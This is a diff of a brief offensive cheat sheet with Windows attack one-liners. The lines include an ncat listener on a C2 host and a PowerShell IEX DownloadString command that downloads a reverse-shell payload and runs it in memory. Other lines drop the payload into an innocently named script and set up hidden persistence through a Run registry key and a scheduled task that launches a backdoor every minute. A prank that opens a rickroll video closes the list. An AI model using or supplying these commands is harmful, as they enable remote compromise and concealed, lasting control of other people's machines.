@@ -1,6 +1,10 @@
-ncat -l -p 4444
-powershell IEX (New-Object Net.WebClient).DownloadString('path_to_reverseshellpayload')
-echo "payload" | Out-File -FilePath notsuspicious.ps1
-add persistence once we gained access with the reverseshell : reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run \V NothingToSeeHere -d "C:\Windows\System32\notsuspicious.ps1" /F 
+ncat -l -p 4444 -> run on C2 to listen to upcoming connexions on port 4444
+
+powershell IEX (New-Object Net.WebClient).DownloadString('path_to_reverseshellpayload') -> download payload and load it into memory directly
+
+@' payload '@ | Set-Content -Path config.ps1 -> get the payload in a file after obtaining the reverse shell
+adding persistence with regedit : reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run \V NotASuspiciousName -d "pathtobackdoor.ps1" /F 
+adding persistence with scheduled tasks : schtasks /create /tn test /tr "powershell.exe -File 'pathtobakdoor.ps1'" /sc minute /mo 1
 
 rickroll : start chrome https://youtu.be/dQw4w9WgXcQ -WindowStyle maximized
+taskkill /IM "chrome.exe" /F
